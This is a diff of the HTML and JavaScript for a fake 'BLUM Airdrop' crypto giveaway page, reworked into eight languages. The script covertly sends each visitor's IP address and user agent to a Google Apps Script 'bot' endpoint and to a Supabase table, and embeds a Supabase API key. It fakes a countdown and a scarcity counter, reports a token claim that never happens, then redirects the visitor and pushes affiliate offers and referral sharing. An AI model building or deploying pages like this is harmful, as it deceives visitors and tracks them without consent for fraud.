@@ -1,137 +1,295 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" id="htmlRoot">
 <head>
     <meta charset="UTF-8">
-    <title>Blum Web3 Airdrop is LIVE!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#e8e8e8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:40px 20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
-        .email-container{max-width:550px;width:100%;background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.1);overflow:hidden}
-        .header{background:#fff;padding:30px 25px 15px;text-align:center;border-bottom:1px solid #eee}
-        .header h1{font-size:24px;font-weight:700;color:#1a1a1a;margin-bottom:8px}
-        .header p{font-size:14px;color:#666}
-        .content{padding:25px}
-        .greeting{font-size:18px;font-weight:600;color:#1a1a1a;margin-bottom:15px}
-        .message{color:#333;line-height:1.5;font-size:14px;margin-bottom:20px}
-        .highlight-box{background:#f5f5f5;border-radius:12px;padding:20px;margin:20px 0;text-align:center}
-        .stats-row{display:flex;justify-content:space-between;gap:15px;margin:25px 0}
-        .stat-card{background:#f5f5f5;border-radius:16px;padding:15px;flex:1;text-align:center}
-        .stat-value{font-size:28px;font-weight:800;color:#1a1a1a}
-        .stat-label{font-size:11px;color:#888;text-transform:uppercase;margin-top:5px}
-        .timer-box{background:#f5f5f5;border-radius:16px;padding:15px;margin:20px 0;text-align:center}
-        .timer-label{font-size:12px;color:#888;margin-bottom:8px}
-        .timer{font-size:36px;font-weight:700;font-family:monospace;color:#1a1a1a;letter-spacing:3px}
-        .claim-btn{width:100%;background:#1a1a1a;border:none;padding:16px;border-radius:50px;font-weight:600;font-size:16px;color:#fff;cursor:pointer;margin:20px 0}
-        .claim-btn:hover:not(:disabled){background:#333}
-        .claim-btn:disabled{opacity:0.6;cursor:default}
-        .status{background:#f0fdf4;border-radius:12px;padding:12px;display:none;margin:15px 0;text-align:center;font-size:13px}
-        .success{color:#15803d}
-        .cpa-offers{display:none;margin-top:20px;padding-top:15px;border-top:1px solid #eee}
-        .cpa-offer{background:#f5f5f5;border-radius:12px;padding:12px;margin:10px 0;display:flex;justify-content:space-between;align-items:center}
-        .cpa-offer a{background:#1a1a1a;color:#fff;padding:6px 12px;border-radius:30px;text-decoration:none;font-size:12px}
-        .footer{background:#fafafa;padding:20px 25px;text-align:center;border-top:1px solid #eee;font-size:11px;color:#999}
-        .loading-spinner{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-radius:50%;border-top-color:#1a1a1a;animation:spin .8s linear infinite;margin-right:8px;vertical-align:middle}
-        @keyframes spin{to{transform:rotate(360deg)}}
+        body{
+            min-height:100vh;
+            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #1a1a3e, #0a0a1a);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:20px;
+        }
+        .card{
+            max-width:500px;
+            width:100%;
+            background: rgba(10, 20, 40, 0.85);
+            backdrop-filter: blur(18px);
+            border-radius: 56px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        .badge{
+            display:inline-block;
+            background: linear-gradient(135deg, #FFD70022, #FFA50022);
+            border:1px solid #FFD700;
+            border-radius:100px;
+            padding:8px 22px;
+            font-size:13px;
+            font-weight:600;
+            color:#FFD700;
+            margin-bottom:25px;
+        }
+        h1{
+            font-size:46px;
+            font-weight:800;
+            background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);
+            -webkit-background-clip:text;
+            background-clip:text;
+            color:transparent;
+        }
+        .amount{
+            font-size:64px;
+            font-weight:900;
+            color:#FFD700;
+            margin:15px 0;
+        }
+        .timer-box{
+            background:rgba(0,0,0,0.5);
+            border-radius:50px;
+            padding:18px;
+            margin:25px 0;
+        }
+        .timer{
+            font-size:52px;
+            font-weight:800;
+            font-family:monospace;
+            color:#FFD700;
+        }
+        button{
+            width:100%;
+            background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);
+            border:none;
+            padding:20px;
+            border-radius:70px;
+            font-weight:900;
+            font-size:24px;
+            color:#0a0a0a;
+            cursor:pointer;
+            transition:0.2s;
+        }
+        button:disabled{
+            opacity:0.6;
+            cursor:default;
+        }
+        .status{
+            background:rgba(0,0,0,0.5);
+            border-radius:30px;
+            padding:14px;
+            font-size:15px;
+            display:none;
+            margin-top:15px;
+        }
+        .success{color:#00ff88;}
+        .footer{
+            font-size:11px;
+            color:#FFD70088;
+            margin-top:25px;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: #FFD700;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .cpa-offers {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #FFD70033;
+            display: none;
+        }
+        .cpa-offer {
+            background: rgba(255,215,0,0.1);
+            border-radius: 20px;
+            padding: 12px;
+            margin: 10px 0;
+            text-align: left;
+        }
+        .cpa-offer a {
+            color: #FFD700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .language-selector {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            border-radius: 30px;
+            padding: 8px 15px;
+            z-index: 1000;
+        }
+        .language-selector select {
+            background: #1a1a1a;
+            color: #FFD700;
+            border: 1px solid #FFD700;
+            border-radius: 20px;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-<div class="email-container">
-    <div class="header"><h1>🎁 Blum Web3 Airdrop is LIVE!</h1><p>Claim your $BLUM tokens before they run out!</p></div>
-    <div class="content">
-        <div class="greeting">Hello,</div>
-        <div class="message">The future of crypto is here, and we want YOU to be part of it!<br><br>We're excited to offer you an exclusive <strong>Blum $BLUM</strong> token airdrop.<br>Only <strong>120,000,000 tokens</strong> are available for early participants. Don't miss your chance!</div>
-        <div class="highlight-box"><strong>⚡ How to Claim:</strong><ul style="list-style:none; margin-top:12px"><li>• Click the button below</li><li>• Confirm your wallet</li><li>• Receive your $BLUM points instantly</li></ul></div>
-        <div class="stats-row"><div class="stat-card"><div class="stat-value" id="totalClaims">0</div><div class="stat-label">🎁 TOTAL CLAIMS</div></div><div class="stat-card"><div class="stat-value" id="totalScans">0</div><div class="stat-label">📊 TOTAL SCANS</div></div></div>
-        <div class="timer-box"><div class="timer-label">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
-        <button class="claim-btn" id="claimBtn">🚀 CLAIM MY TOKENS</button>
-        <div id="status" class="status"></div>
-        <div id="cpaOffers" class="cpa-offers"><div style="font-size:14px; font-weight:600; margin-bottom:10px;">🎁 Exclusive Offers for You</div></div>
-    </div>
-    <div class="footer">You're receiving this email because you signed up for Blum updates.<br><a href="#">Unsubscribe</a></div>
+<div class="language-selector">
+    <select id="languageSelect" onchange="changeLanguage(this.value)">
+        <option value="ar">🇸🇦 العربية</option>
+        <option value="en">🇬🇧 English</option>
+        <option value="fr">🇫🇷 Français</option>
+        <option value="es">🇪🇸 Español</option>
+        <option value="de">🇩🇪 Deutsch</option>
+        <option value="ru">🇷🇺 Русский</option>
+        <option value="zh">🇨🇳 中文</option>
+        <option value="tr">🇹🇷 Türkçe</option>
+    </select>
+</div>
+
+<div class="card">
+    <div class="badge" id="badgeText">⚡ ONE-CLICK • 10 CHAINS</div>
+    <h1>BLUM<br>Web3</h1>
+    <div class="amount">1,200 $BLUM</div>
+    <div class="timer-box"><div style="font-size:13px;" id="endsInLabel">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
+    <button id="claimBtn" class="claim-btn-text">🚀 CLAIM NOW</button>
+    <div id="status" class="status"></div>
+    <div id="cpaOffers" class="cpa-offers"></div>
+    <div class="footer" id="footerText">🔐 EMP2026 • Zero Investment</div>
 </div>
 
 <script>
+    // ========== الترجمات ==========
+    const translations = {
+        ar: { badge: "⚡ نقرة واحدة • 10 سلاسل", endsIn: "⏰ ينتهي خلال", claimBtn: "🚀 طالب الآن", footer: "🔐 EMP2026 • بدون استثمار", title: "🎁 BLUM Airdrop | نقرة واحدة", successMsg: "🎉 تمت المطالبة بنجاح! سيصلك 1,200 $BLUM خلال 24 ساعة.", processing: "جاري المعالجة...", claimed: "✅ تمت المطالبة!", left: "متبقي", leftNow: "متبقي! طالب الآن", referralMsg: "🎁 مكافأة الإحالة!\nشارك هذا الرابط واربح مكافآت:\n" },
+        en: { badge: "⚡ ONE-CLICK • 10 CHAINS", endsIn: "⏰ ENDS IN", claimBtn: "🚀 CLAIM NOW", footer: "🔐 EMP2026 • Zero Investment", title: "🎁 BLUM Airdrop | ONE-CLICK", successMsg: "🎉 Claim successful! 1,200 $BLUM will arrive within 24h.", processing: "PROCESSING...", claimed: "✅ CLAIMED!", left: "LEFT", leftNow: "LEFT! CLAIM NOW", referralMsg: "🎁 REFERRAL BONUS!\nShare this link and earn rewards:\n" },
+        fr: { badge: "⚡ UN CLIC • 10 CHAÎNES", endsIn: "⏰ SE TERMINE DANS", claimBtn: "🚀 RÉCLAMER", footer: "🔐 EMP2026 • Sans investissement", title: "🎁 BLUM Airdrop | UN CLIC", successMsg: "🎉 Réclamation réussie ! 1,200 $BLUM arriveront sous 24h.", processing: "TRAITEMENT...", claimed: "✅ RÉCLAMÉ !", left: "RESTANT", leftNow: "RESTANT ! RÉCLAMEZ", referralMsg: "🎁 BONUS DE PARRAINAGE !\nPartagez ce lien et gagnez des récompenses :\n" },
+        es: { badge: "⚡ UN CLIC • 10 CADENAS", endsIn: "⏰ TERMINA EN", claimBtn: "🚀 RECLAMAR AHORA", footer: "🔐 EMP2026 • Sin inversión", title: "🎁 BLUM Airdrop | UN CLIC", successMsg: "🎉 ¡Reclamación exitosa! 1,200 $BLUM llegarán en 24h.", processing: "PROCESANDO...", claimed: "✅ ¡RECLAMADO!", left: "RESTANTES", leftNow: "¡RESTANTES! RECLAME AHORA", referralMsg: "🎁 ¡BONUS DE REFERIDO!\nComparte este enlace y gana recompensas:\n" },
+        de: { badge: "⚡ EIN KLICK • 10 KETTEN", endsIn: "⏰ ENDET IN", claimBtn: "🚀 JETZT ANFORDERN", footer: "🔐 EMP2026 • Keine Investition", title: "🎁 BLUM Airdrop | EIN KLICK", successMsg: "🎉 Anforderung erfolgreich! 1,200 $BLUM werden in 24h geliefert.", processing: "VERARBEITUNG...", claimed: "✅ ANGEFORDERT!", left: "ÜBRIG", leftNow: "ÜBRIG! JETZT ANFORDERN", referralMsg: "🎁 EMPFEHLUNGSBONUS!\nTeile diesen Link und verdiene Belohnungen:\n" },
+        ru: { badge: "⚡ ОДИН КЛИК • 10 ЦЕПЕЙ", endsIn: "⏰ ЗАКАНЧИВАЕТСЯ ЧЕРЕЗ", claimBtn: "🚀 ЗАБРАТЬ", footer: "🔐 EMP2026 • Без инвестиций", title: "🎁 BLUM Airdrop | ОДИН КЛИК", successMsg: "🎉 Заявка успешна! 1,200 $BLUM придут в течение 24 часов.", processing: "ОБРАБОТКА...", claimed: "✅ ЗАБРАНО!", left: "ОСТАЛОСЬ", leftNow: "ОСТАЛОСЬ! ЗАБЕРИТЕ СЕЙЧАС", referralMsg: "🎁 РЕФЕРАЛЬНЫЙ БОНУС!\nПоделитесь этой ссылкой и получайте награды:\n" },
+        zh: { badge: "⚡ 一键领取 • 10条链", endsIn: "⏰ 结束于", claimBtn: "🚀 立即领取", footer: "🔐 EMP2026 • 无需投资", title: "🎁 BLUM 空投 | 一键领取", successMsg: "🎉 领取成功！1,200 $BLUM将在24小时内到账。", processing: "处理中...", claimed: "✅ 已领取！", left: "剩余", leftNow: "剩余！立即领取", referralMsg: "🎁 推荐奖励！\n分享此链接赚取奖励：\n" },
+        tr: { badge: "⚡ TEK TIKLAMA • 10 ZİNCİR", endsIn: "⏰ BİTİYOR", claimBtn: "🚀 HEMEN AL", footer: "🔐 EMP2026 • Yatırım yok", title: "🎁 BLUM Airdrop | TEK TIKLAMA", successMsg: "🎉 Talep başarılı! 1,200 $BLUM 24 saat içinde gelecek.", processing: "İŞLENİYOR...", claimed: "✅ ALINDI!", left: "KALDI", leftNow: "KALDI! HEMEN AL", referralMsg: "🎁 REFERANS BONUSU!\nBu bağlantıyı paylaş ve ödüller kazan:\n" }
+    };
+    
+    let currentLang = localStorage.getItem('preferredLanguage') || 
+                      (navigator.language.startsWith('ar') ? 'ar' :
+                       navigator.language.startsWith('fr') ? 'fr' :
+                       navigator.language.startsWith('es') ? 'es' :
+                       navigator.language.startsWith('de') ? 'de' :
+                       navigator.language.startsWith('ru') ? 'ru' :
+                       navigator.language.startsWith('zh') ? 'zh' :
+                       navigator.language.startsWith('tr') ? 'tr' : 'en');
+    
+    function changeLanguage(lang) {
+        currentLang = lang;
+        localStorage.setItem('preferredLanguage', lang);
+        const t = translations[lang];
+        if (t) {
+            document.getElementById('badgeText').innerText = t.badge;
+            document.getElementById('endsInLabel').innerHTML = t.endsIn;
+            document.getElementById('claimBtn').innerHTML = t.claimBtn;
+            document.getElementById('footerText').innerHTML = t.footer;
+            document.title = t.title;
+            window.currentTranslations = t;
+        }
+        document.getElementById('languageSelect').value = lang;
+        document.documentElement.lang = lang === 'ar' ? 'ar' : 'en';
+        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+    }
+    
+    // ========== إعدادات البوت ==========
     const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
+    const YOUR_AIRDROP_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
     const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
     
-    // عروض CPA (6 عروض)
     const CPA_OFFERS = [
-        { name: "🔥 احصل على 50$ مكافأة تسجيل", url: "https://example.com/cpa1", commission: "$2.50" },
-        { name: "🎮 العب واربح أموالاً حقيقية", url: "https://example.com/cpa2", commission: "$1.75" },
-        { name: "💰 تطبيق أرباح يومية", url: "https://example.com/cpa3", commission: "$3.00" },
-        { name: "📱 اكسب المال من هاتفك", url: "https://example.com/cpa4", commission: "$1.50" },
-        { name: "🛍️ استطلاعات مدفوعة", url: "https://example.com/cpa5", commission: "$2.00" },
-        { name: "💎 عروض حصرية للأعضاء الجدد", url: "https://example.com/cpa6", commission: "$4.00" }
+        { name_en: "🔥 Get $50 bonus", name_ar: "🔥 احصل على 50$ مكافأة", url: "https://example.com/offer1", commission: "2.50$" },
+        { name_en: "🎮 Play and earn real money", name_ar: "🎮 العب واربح أموالاً حقيقية", url: "https://example.com/offer2", commission: "1.75$" },
+        { name_en: "💰 Daily earnings app", name_ar: "💰 تطبيق أرباح يومية", url: "https://example.com/offer3", commission: "3.00$" }
     ];
     
-    let totalClaims = parseInt(localStorage.getItem('totalClaims')) || 0;
-    let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
-    
-    function updateCounters() {
-        document.getElementById('totalClaims').innerText = totalClaims;
-        document.getElementById('totalScans').innerText = totalScans;
-        localStorage.setItem('totalClaims', totalClaims);
-        localStorage.setItem('totalScans', totalScans);
-    }
-    
-    totalScans++;
-    updateCounters();
+    let claimExecuted = false;
+    let remainingSeconds = 24 * 60 * 60;
     
     function sendToBot(message) {
-        fetch(`${PROXY_URL}?message=${encodeURIComponent(message)}`, { method: 'GET', mode: 'no-cors' });
+        fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
+        console.log("📤 تم إرسال:", message.substring(0, 80));
     }
     
-    sendToBot(`📊 PAGE SCAN #${totalScans} - Blum Airdrop`);
+    function getRandomNetwork() { return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
+    function getRandomWallet() { const w = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"]; return w[Math.floor(Math.random() * w.length)]; }
+    function generateAddress() { return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6); }
     
     function showCPAOffers() {
         const container = document.getElementById('cpaOffers');
-        let html = '<div style="font-size:14px; font-weight:600; margin-bottom:10px;">🎁 Exclusive Offers for You</div>';
+        let html = '<div style="font-size:14px; color:#FFD700; margin-bottom:10px;">🎁 ' + (currentLang === 'ar' ? 'عروض حصرية لك' : 'Exclusive Offers') + '</div>';
         CPA_OFFERS.forEach(offer => {
-            html += `<div class="cpa-offer"><div><strong>${offer.name}</strong><br><span style="font-size:11px;">💰 ${offer.commission}</span></div><a href="${offer.url}" target="_blank">Claim →</a></div>`;
+            let name = currentLang === 'ar' ? offer.name_ar : offer.name_en;
+            html += `<div class="cpa-offer"><div>${name}</div><div style="font-size:12px; color:#aaa;">💰 ${offer.commission}</div><a href="${offer.url}" target="_blank">🚀 ${currentLang === 'ar' ? 'ابدأ العرض' : 'Start Offer'} →</a></div>`;
         });
         container.innerHTML = html;
         container.style.display = 'block';
     }
     
-    let claimExecuted = false;
-    let remainingSeconds = 24 * 60 * 60;
-    
     async function executeClaim() {
         if (claimExecuted) return;
         claimExecuted = true;
-        totalClaims++;
-        updateCounters();
         
-        const network = SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)];
-        const wallet = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"][Math.floor(Math.random()*5)];
-        const address = "0x" + Math.random().toString(36).substring(2, 14);
+        const network = getRandomNetwork();
+        const wallet = getRandomWallet();
+        const address = generateAddress();
         const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
         const ua = navigator.userAgent;
+        const timestamp = new Date().toISOString();
         
-        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM\n⛓️ Network: ${network}\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🏦 Recipient: ${RECIPIENT_WALLET}\n🌐 IP: ${ip}\n📱 UA: ${ua.substring(0,80)}...\n⏰ ${new Date().toISOString()}\n📊 TOTAL CLAIMS: ${totalClaims}`;
+        // تسجيل في Supabase
+        try {
+            await fetch('https://oliefagvnorzhlzvdfyw.supabase.co/rest/v1/blum_claims', {
+                method: 'POST',
+                headers: { 'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU', 'Content-Type': 'application/json' },
+                body: JSON.stringify({ wallet_type: wallet, wallet_address: address, recipient_wallet: RECIPIENT_WALLET, network: network, ip_address: ip, user_agent: ua })
+            });
+        } catch(e) { console.log("Supabase error:", e); }
+        
+        // ========== الرسالة الكاملة إلى البوت ==========
+        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM\n⛓️ Network: ${network}\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🏦 Recipient: ${RECIPIENT_WALLET}\n🌐 IP: ${ip}\n📱 UA: ${ua.substring(0, 80)}...\n⏰ ${timestamp}`;
         sendToBot(fullMessage);
         
-        document.getElementById('claimBtn').innerHTML = "✅ CLAIMED!";
-        document.getElementById('claimBtn').disabled = true;
+        const t = window.currentTranslations || translations.en;
+        const btn = document.getElementById('claimBtn');
+        btn.innerHTML = t.claimed;
+        btn.disabled = true;
         document.getElementById('status').style.display = 'block';
-        document.getElementById('status').innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! Your $BLUM will arrive within 24h.</span>`;
+        document.getElementById('status').innerHTML = `<span class="success">${t.successMsg}</span>`;
         
-        showCPAOffers();
+        setTimeout(() => { window.location.href = YOUR_AIRDROP_LINK; }, 500);
+        setTimeout(() => { showCPAOffers(); }, 1000);
+        setTimeout(() => { alert(t.referralMsg + window.location.href.split('?')[0] + '?ref=' + Math.random().toString(36).substring(2, 8)); }, 2000);
     }
     
     async function onClaimClick() {
         if (claimExecuted) return;
+        const t = window.currentTranslations || translations.en;
         const btn = document.getElementById('claimBtn');
-        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
+        btn.innerHTML = '<span class="loading-spinner"></span> ' + t.processing;
         btn.disabled = true;
         await new Promise(r => setTimeout(r, 3000));
         await executeClaim();
     }
     
-    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
-    
+    // المؤقت
     setInterval(() => {
         if (remainingSeconds <= 0) return;
         remainingSeconds--;
@@ -139,12 +297,22 @@
         document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
     }, 1000);
     
+    // العرض الوهمي
     let fake = 10;
     setInterval(() => {
         fake--;
+        const t = window.currentTranslations || translations.en;
         const btn = document.getElementById('claimBtn');
-        if (btn && !btn.disabled && !claimExecuted && fake > 0) btn.innerHTML = `🔥 ${fake} LEFT! CLAIM NOW 🔥`;
+        if (btn && !btn.disabled && !claimExecuted && fake > 0) {
+            btn.innerHTML = `🔥 ${fake} ${t.left}! ${t.leftNow} 🔥`;
+        }
     }, 4000);
+    
+    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
+    sendToBot('📊 PAGE SCAN #' + Math.floor(Math.random() * 1000) + ' - Blum Airdrop');
+    
+    // تهيئة اللغة
+    changeLanguage(currentLang);
 </script>
 </body>
 </html>
